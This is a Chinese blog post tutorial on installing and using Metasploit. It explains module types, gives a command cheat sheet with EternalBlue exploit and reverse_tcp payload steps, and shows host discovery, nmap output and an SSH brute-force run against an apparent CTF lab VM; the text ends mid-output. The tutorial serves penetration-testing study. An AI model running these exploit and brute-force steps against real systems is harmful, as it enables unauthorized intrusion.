<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Metasploit简介及使用 | icon'Blog</title><meta name="author" content="icon"><meta name="copyright" content="icon"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="Metasploit使用：安装： 在一般的linux中，默认是不安装MSF的。以下是在非kali的Linux下安装MSF框架。 一键安装： 123456789101112curl https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;rapid7&#x2F;metasploit-omnibus&#x2F;master&#x2F;config&#x2F;templates&#x2F;metasploit-framework-wrapp">
<meta property="og:type" content="article">
<meta property="og:title" content="Metasploit简介及使用">
<meta property="og:url" content="https://iconabc.github.io/posts/50aa4c3b.html">
<meta property="og:site_name" content="icon&#39;Blog">
<meta property="og:description" content="Metasploit使用：安装： 在一般的linux中，默认是不安装MSF的。以下是在非kali的Linux下安装MSF框架。 一键安装： 123456789101112curl https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;rapid7&#x2F;metasploit-omnibus&#x2F;master&#x2F;config&#x2F;templates&#x2F;metasploit-framework-wrapp">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://iconabc.github.io/img/mbc.jpg">
<meta property="article:published_time" content="2024-11-15T16:36:16.000Z">
<meta property="article:modified_time" content="2024-11-15T16:39:59.790Z">
<meta property="article:author" content="icon">
<meta property="article:tag" content="tool">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://iconabc.github.io/img/mbc.jpg"><link rel="shortcut icon" href="/img/shasha.png"><link rel="canonical" href="https://iconabc.github.io/posts/50aa4c3b.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
  copy: {
    success: '复制成功',
    error: '复制失败',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: {"limitCount":150,"languages":{"author":"作者: icon","link":"链接: ","source":"来源: icon'Blog","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'Metasploit简介及使用',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  isShuoshuo: false
}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/mbc.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">12</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">6</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">12</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> about</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/shuai.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">icon'Blog</span></a><a class="nav-page-title" href="/"><span class="site-name">Metasploit简介及使用</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> about</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">Metasploit简介及使用</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-11-15T16:36:16.000Z" title="发表于 2024-11-16 00:36:16">2024-11-16</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-11-15T16:39:59.790Z" title="更新于 2024-11-16 00:39:59">2024-11-16</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Metasploit/">Metasploit</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">总字数:</span><span class="word-count">7.4k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>35分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="Metasploit使用："><a href="#Metasploit使用：" class="headerlink" title="Metasploit使用："></a>Metasploit使用：</h1><p>安装：</p>
<p>在一般的linux中，默认是不安装MSF的。以下是在非kali的Linux下安装MSF框架。</p>
<p>一键安装：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &gt; msfinstall &amp;&amp; chmod 755 msfinstall &amp;&amp; ./msfinstall</span><br><span class="line"></span><br><span class="line">adduser msf #添加msf用户</span><br><span class="line">su msf #切换到msf用户</span><br><span class="line">cd /opt/metasploit-framework/bin #切换到msf所在的目录</span><br><span class="line">./msfconsole #以后启动msfconsole，都切换到msf用户下启动，这样会同步数据库。如果使用root用户启动的话，不会同步数据库</span><br><span class="line"></span><br><span class="line">也可以将msfconsole加入到执行目录下，这样在任何目录直接msfconsole就可以了</span><br><span class="line">ln -s /opt/metasploit-framework/bin/msfconsole /usr/bin/msfconsole</span><br><span class="line"></span><br><span class="line">#备注：</span><br><span class="line">#初次运行msf会创建数据库，但是msf默认使用的PostgreSQl数据库不能与root用户关联，这也就是需要新建用户msf来运行metasploit的原因所在。如果你不小心手一抖，初次运行是在root用户下，请使用msfdb reinit命令，然后使用非root用户初始化数据库。</span><br></pre></td></tr></table></figure>



<h2 id="1，技术架构如下："><a href="#1，技术架构如下：" class="headerlink" title="1，技术架构如下："></a>1，技术架构如下：</h2><p><img src="/posts/4a17b156/%E5%8F%8A%E4%BD%BF%E7%94%A8/image-20240729161615909.png" alt="image-20240729161615909"></p>
<h3 id="auxiliary：辅助模块"><a href="#auxiliary：辅助模块" class="headerlink" title="auxiliary：辅助模块"></a>auxiliary：辅助模块</h3><p>Metasploit 为渗透测试的信息搜集环节提供了大量的辅助模块支持，包括针对各种网络服务的扫描与查点、构建虚假服务收集登录密码、口令猜测破解、敏感信息嗅探、探查敏感信息泄露、Fuzz 测试发掘漏洞、实施网络协议欺骗等模块。<br>辅助模块能够帮助渗透测试者在渗透攻击之前取得目标系统丰富的情报信息。</p>
<h3 id="encoders：编码器模块"><a href="#encoders：编码器模块" class="headerlink" title="encoders：编码器模块"></a>encoders：编码器模块</h3><p>​		攻击载菏模块与空指令模块组装完成一个指令序列后，在这段指令被渗透攻击模块加入邪恶数据缓冲区交由目标系统运行之前，Metasploit框架还需要完成一道非常重要的工序-<strong>编码</strong>。</p>
<ul>
<li>确保攻击载荷中不会出现渗透攻击过程中应加以避免的”坏字符”</li>
<li>对攻击载荷进行“免杀”处理。</li>
</ul>
<h3 id="evasion：免杀模块"><a href="#evasion：免杀模块" class="headerlink" title="evasion：免杀模块"></a>evasion：免杀模块</h3><p>​		对攻击载荷进行“免杀”处理。</p>
<h3 id="exploits：渗透攻击模块"><a href="#exploits：渗透攻击模块" class="headerlink" title="exploits：渗透攻击模块"></a>exploits：渗透攻击模块</h3><p>​		渗透攻击模块是利用发现的安全漏洞或配置弱点对目标系统进行攻击，以植入和运行攻击载荷，从而获取对远程目标系统访问权的代码组件。</p>
<p>​		主动渗透攻击所利用的安全漏洞位于网络服务端软件与服务承载的上层应用程序之中，由于这些服务通常是在主机上开启一些监听端口并等待客户端连接，因此针对它们的渗透攻击可以主动发起，通过连接目标系统网络服务，注入一些特殊构造的包含”邪恶”攻击数据的网络请求内容，触发安全漏洞，并使得远程服务进程执行在”邪恶”数据中包含攻击载荷，从而获取目标系统的控制会话</p>
<p>​		被动渗透攻击利用的漏洞位于客户端软件中，如浏览器、浏览器插件、电子邮件客户端、0ffice 与Adobe等各种文档阅读与编辑软件。对于这类存在于客户端软件的安全漏洞，无法主动地将数据从远程输入到客户端软件中，因此只能采用被动渗透攻击的方式，即构造出”邪恶”的网页、电子邮件或文档文件，并通过架设包含此类恶意内容的服务、发送邮件附件、结合社会工程学分发并诱骗目标用户打开、结合网络欺骗和劫持技术等方式，等目标系统上的用户访问到这些邪恶的内容，从而触发客户端软件中的安全漏洞，给出控制目标系统的Shell会话。</p>
<h3 id="nops：空指令模块"><a href="#nops：空指令模块" class="headerlink" title="nops：空指令模块"></a>nops：空指令模块</h3><p>​		空指令是一些对程序运行状态不会造成任何实质影响的空操作或者无关操作指令，最典型的空指令就是空操作，在x86 CPU体系架构平台上的操作码是0x90。</p>
<p>​		“占位”。</p>
<h3 id="payloads：攻击载荷模块"><a href="#payloads：攻击载荷模块" class="headerlink" title="payloads：攻击载荷模块"></a>payloads：攻击载荷模块</h3><p>​		攻击载荷是在渗透攻击成功后使目标系统运行的一段植入代码，通常作用是作为渗透攻击者打开在目标系统上的<strong>控制会话连接</strong>。</p>
<p>​		MSF中特指会话链接方式，例如TCP反弹链接等。</p>
<h3 id="post：后渗透模块"><a href="#post：后渗透模块" class="headerlink" title="post：后渗透模块"></a>post：后渗透模块</h3><p>​		后渗透攻击模块主要是支持在渗透攻击取得目标系统访问权或者控制权之后，在受控系统中进行各式各样的后渗透攻击动作，比如获取敏感信息，进一步扩展，实施跳板攻击等。</p>
<h2 id="2，命令速查"><a href="#2，命令速查" class="headerlink" title="2，命令速查"></a>2，命令速查</h2><table>
<thead>
<tr>
<th align="center">命令</th>
<th align="center">解释</th>
</tr>
</thead>
<tbody><tr>
<td align="center">msfconsole</td>
<td align="center">命令行模式启动MSF</td>
</tr>
<tr>
<td align="center">exit</td>
<td align="center">退出msf控制台终端<br>退出会话</td>
</tr>
<tr>
<td align="center">use</td>
<td align="center">选择某一个模块</td>
</tr>
<tr>
<td align="center">info</td>
<td align="center">查看模块详细信息</td>
</tr>
<tr>
<td align="center">set</td>
<td align="center">对模块选项进行配置</td>
</tr>
<tr>
<td align="center">show options</td>
<td align="center">查看脚本配置选项</td>
</tr>
<tr>
<td align="center">run<br>exploit</td>
<td align="center">启动脚本</td>
</tr>
<tr>
<td align="center">search</td>
<td align="center">搜索关键字<br>type:auxiliary<br>path:telnet<br>cve:2018-7600</td>
</tr>
<tr>
<td align="center">show targets</td>
<td align="center">显示适用的主机类型</td>
</tr>
<tr>
<td align="center">show payloads</td>
<td align="center">显示适用的payload类型</td>
</tr>
<tr>
<td align="center">background</td>
<td align="center">讲会话隐藏在后台</td>
</tr>
<tr>
<td align="center">sessions -i</td>
<td align="center">会话管理</td>
</tr>
</tbody></table>
<h3 id="搜索命令用法示例："><a href="#搜索命令用法示例：" class="headerlink" title="搜索命令用法示例："></a>搜索命令用法示例：</h3><p>search ms17-010</p>
<p>search bluekeep</p>
<p>search CVE:2018-7600</p>
<p>search type:auxiliary path:telnet</p>
<h3 id="简单使用："><a href="#简单使用：" class="headerlink" title="简单使用："></a>简单使用：</h3><ul>
<li>进入框架msfconsole</li>
<li>使用use进入指定模块：use exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_eternalblue</li>
<li>使用info查看模块信息：info</li>
<li>设置攻击载荷：set payload windows&#x2F;x64&#x2F;meterpreter&#x2F;reveerse_tcp</li>
<li>查看模块需要配置的参数：set rhost 10.1.1.4</li>
<li>攻击：exploit &#x2F; run或者直接run</li>
<li>后渗透阶段</li>
</ul>
<p>不同攻击用到的步骤也不一样，这不是一成不变的，需要灵活运用。</p>
<p>我们也可以将攻击代码写入configure.rc（只要是以.rc结尾的文件）配置文件中，然后使用命令msfconsole -r configure.rc将进行自动攻击</p>
<h2 id="3，情报收集"><a href="#3，情报收集" class="headerlink" title="3，情报收集"></a>3，情报收集</h2><h4 id="主机发现与端口扫描："><a href="#主机发现与端口扫描：" class="headerlink" title="主机发现与端口扫描："></a>主机发现与端口扫描：</h4><p>Metasploit提供了一些辅助模块可用于<strong>主机发现</strong>：</p>
<p><code>auxiliary/scanner/discovery/*</code></p>
<p>查看目录：</p>
<p><img src="/posts/4a17b156/%E5%8F%8A%E4%BD%BF%E7%94%A8/image-20240729191938977.png" alt="image-20240729191938977"></p>
<p>发现如上几个功能。</p>
<p>可以使用arp_sweep来枚举本地局域网中的所有活跃主机。</p>
<p>我们进入该模块使用以下命令：</p>
<p><code>use auxiliary/scanner/discovery/arp_sweep</code></p>
<p>然后<code>show options</code>查看需要设置的参数：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">msf6 auxiliary(scanner/discovery/arp_sweep) &gt; set Rhosts 192.168.189.0/24</span><br><span class="line">Rhosts =&gt; 192.168.189.0/24</span><br><span class="line">msf6 auxiliary(scanner/discovery/arp_sweep) &gt; set threads 50</span><br><span class="line">threads =&gt; 50</span><br><span class="line">msf6 auxiliary(scanner/discovery/arp_sweep) &gt; run</span><br><span class="line"></span><br><span class="line">[+] 192.168.189.1 appears to be up (VMware, Inc.).</span><br><span class="line">[+] 192.168.189.2 appears to be up (VMware, Inc.).</span><br><span class="line">[+] 192.168.189.254 appears to be up (VMware, Inc.).</span><br><span class="line">[+] 192.168.189.138 appears to be up (VMware, Inc.).</span><br><span class="line">[+] 192.168.189.139 appears to be up (VMware, Inc.).</span><br><span class="line">[+] 192.168.189.142 appears to be up (VMware, Inc.).</span><br><span class="line">[+] 192.168.189.254 appears to be up (VMware, Inc.).</span><br><span class="line">[+] 192.168.189.254 appears to be up (VMware, Inc.).</span><br><span class="line">[*] Scanned 256 of 256 hosts (100% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br></pre></td></tr></table></figure>

<p>可以设置扫描网段，以及扫描线程等等！</p>
<p>不过还是得使用nmap来进行扫描要好用一些，当扫描数量一旦上去，你就会知道为什么nmap被称作扫描之王了。</p>
<p>以下功能可进行端口扫描：</p>
<p><code>auxiliary/scanner/postscan/*</code></p>
<p>查看目录下内容：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">└─# tree /usr/share/metasploit-framework/modules/auxiliary/scanner/portscan </span><br><span class="line">/usr/share/metasploit-framework/modules/auxiliary/scanner/portscan</span><br><span class="line">├── ack.rb</span><br><span class="line">├── ftpbounce.rb</span><br><span class="line">├── syn.rb</span><br><span class="line">├── tcp.rb</span><br><span class="line">└── xmas.rb</span><br></pre></td></tr></table></figure>

<p>有上述几个功能，建议使用syn扫描端口不易被发现。</p>
<p>但是扫描速度很慢的，还是要用扫描器之王nmap相当快。</p>
<h4 id="探查服务的详细版本："><a href="#探查服务的详细版本：" class="headerlink" title="探查服务的详细版本："></a>探查服务的详细版本：</h4><p>在metasploit中可以调用系统中的命令，比如可以使用nmap探测目标的详细服务信息。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">msf6 auxiliary(scanner/portscan/syn) &gt; nmap -A -p- -sS -sC -T4 -Pn 192.168.189.139</span><br><span class="line">[*] exec: nmap -A -p- -sS -sC -T4 -Pn 192.168.189.139</span><br><span class="line"></span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-29 20:07 CST</span><br><span class="line">Nmap scan report for 192.168.189.139</span><br><span class="line">Host is up (0.00100s latency).</span><br><span class="line">Not shown: 65531 closed tcp ports (reset)</span><br><span class="line">PORT      STATE SERVICE VERSION</span><br><span class="line">22/tcp    open  ssh     OpenSSH 6.0p1 Debian 4+deb7u7 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   1024 c4:d6:59:e6:77:4c:22:7a:96:16:60:67:8b:42:48:8f (DSA)</span><br><span class="line">|   2048 11:82:fe:53:4e:dc:5b:32:7f:44:64:82:75:7d:d0:a0 (RSA)</span><br><span class="line">|_  256 3d:aa:98:5c:87:af:ea:84:b8:23:68:8d:b9:05:5f:d8 (ECDSA)</span><br><span class="line">80/tcp    open  http    Apache httpd 2.2.22 ((Debian))</span><br><span class="line">|_http-generator: Drupal 7 (http://drupal.org)</span><br><span class="line">| http-robots.txt: 36 disallowed entries (15 shown)</span><br><span class="line">| /includes/ /misc/ /modules/ /profiles/ /scripts/ </span><br><span class="line">| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt </span><br><span class="line">| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt </span><br><span class="line">|_/LICENSE.txt /MAINTAINERS.txt</span><br><span class="line">|_http-title: Welcome to Drupal Site | Drupal Site</span><br><span class="line">|_http-server-header: Apache/2.2.22 (Debian)</span><br><span class="line">111/tcp   open  rpcbind 2-4 (RPC #100000)</span><br><span class="line">| rpcinfo: </span><br><span class="line">|   program version    port/proto  service</span><br><span class="line">|   100000  2,3,4        111/tcp   rpcbind</span><br><span class="line">|   100000  2,3,4        111/udp   rpcbind</span><br><span class="line">|   100000  3,4          111/tcp6  rpcbind</span><br><span class="line">|   100000  3,4          111/udp6  rpcbind</span><br><span class="line">|   100024  1          36985/tcp   status</span><br><span class="line">|   100024  1          42276/udp6  status</span><br><span class="line">|   100024  1          50121/tcp6  status</span><br><span class="line">|_  100024  1          58573/udp   status</span><br><span class="line">36985/tcp open  status  1 (RPC #100024)</span><br><span class="line">MAC Address: 00:0C:29:84:E2:7E (VMware)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 3.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:3</span><br><span class="line">OS details: Linux 3.2 - 3.16</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   1.00 ms 192.168.189.139</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 27.04 seconds</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="服务查点："><a href="#服务查点：" class="headerlink" title="服务查点："></a>服务查点：</h4><p>​		在metasploit的辅助模块中，有很多用于服务扫描和查点的工具，这些工具通常以类似的方式ssh_version命名。该模块可用于遍历网络中包含某种服务的主机。并进一步确定服务的版本。</p>
<h5 id="ssh服务查点："><a href="#ssh服务查点：" class="headerlink" title="ssh服务查点："></a>ssh服务查点：</h5><p>​		通常管理员会使用SSH 对服务器进行远程管理，服务器会向SSH 客户端返回一个远程Shell 连接。如果没有做其他的安全增强配置，只要获取服务的登录口令，就可以使用SSH 客户端登录服务器，那就相当于获取了响应登录用户的所有权限。<strong>可以使用ssh_version 模块遍历网络中开启SSH 服务的主机</strong>。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; search ssh_version</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   #  Name                                       Disclosure Date  Rank    Check  Description</span><br><span class="line">   -  ----                                       ---------------  ----    -----  -----------</span><br><span class="line">   0  auxiliary/fuzzers/ssh/ssh_version_15                        normal  No     SSH 1.5 Version Fuzzer</span><br><span class="line">   1  auxiliary/fuzzers/ssh/ssh_version_2                         normal  No     SSH 2.0 Version Fuzzer</span><br><span class="line">   2  auxiliary/fuzzers/ssh/ssh_version_corrupt                   normal  No     SSH Version Corruption</span><br><span class="line">   3  auxiliary/scanner/ssh/ssh_version                           normal  No     SSH Version Scanner</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Interact with a module by name or index. For example info 3, use 3 or use auxiliary/scanner/ssh/ssh_version</span><br></pre></td></tr></table></figure>

<p>在ssh_login这个功能还可以达到爆破用户的效果：（不过扫描速度确实也是比较堪忧）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">msf6 auxiliary(scanner/ssh/ssh_login) &gt; run</span><br><span class="line"></span><br><span class="line">[*] 192.168.189.139:22 - Starting bruteforce</span><br><span class="line">[-] 192.168.189.139:22 - Failed: &#x27;flag4:flag4&#x27;</span><br><span class="line">[!] No active DB -- Credential data will not be saved!</span><br><span class="line">[-] 192.168.189.139:22 - Failed: &#x27;flag4:&#x27;</span><br><span class="line">[-] 192.168.189.139:22 - Failed: &#x27;flag4:#!comment: This list has been compiled by Solar Designer of Openwall Project&#x27;</span><br><span class="line">[-] 192.168.189.139:22 - Failed: &#x27;flag4:#!comment: in 1996 through 2011.  It is assumed to be in the public domain.&#x27;</span><br><span class="line">[-] 192.168.189.139:22 - Failed: &#x27;flag4:#!comment:&#x27;</span><br><span class="line">[-] 192.168.189.139:22 - Failed: &#x27;flag4:#!comment: This list is based on passwords most commonly seen on a set of Unix&#x27;</span><br><span class="line">[-] 192.168.189.139:22 - Failed: &#x27;flag4:#!comment: systems in mid-1990&#x27;s, sorted for decreasing number of occurrences&#x27;</span><br><span class="line">[-] 192.168.189.139:22 - Failed: &#x27;flag4:#!comment: (that is, more common passwords are listed first).  It has been&#x27;</span><br><span class="line">[-] 192.168.189.139:22 - Failed: &#x27;flag4:#!comment: revised to also include common website passwords from public lists&#x27;</span><br><span class="line">[-] 192.168.189.139:22 - Failed: &#x27;flag4:#!comment: of &quot;top N passwords&quot; from major community website compromises that&#x27;</span><br><span class="line">[-] 192.168.189.139:22 - Failed: &#x27;flag4:#!comment: occurred in 2006 through 2010.&#x27;</span><br><span class="line">[-] 192.168.189.139:22 - Failed: &#x27;flag4:#!comment:&#x27;</span><br><span class="line">[-] 192.168.189.139:22 - Failed: &#x27;flag4:#!comment: Last update: 2011/11/20 (3546 entries)&#x27;</span><br><span class="line">[-] 192.168.189.139:22 - Failed: &#x27;flag4:#!comment:&#x27;</span><br><span class="line">[-] 192.168.189.139:22 - Failed: &#x27;flag4:#!comment: For more wordlists, see https://www.openwall.com/wordlists/&#x27;</span><br><span class="line">[-] 192.168.189.139:22 - Failed: &#x27;flag4:123456&#x27;</span><br><span class="line">[-] 192.168.189.139:22 - Failed: &#x27;flag4:12345&#x27;</span><br><span class="line">[-] 192.168.189.139:22 - Failed: &#x27;flag4:password&#x27;</span><br><span class="line">[-] 192.168.189.139:22 - Failed: &#x27;flag4:password1&#x27;</span><br><span class="line">[-] 192.168.189.139:22 - Failed: &#x27;flag4:123456789&#x27;</span><br><span class="line">[-] 192.168.189.139:22 - Failed: &#x27;flag4:12345</span><br><span class="line">.................</span><br><span 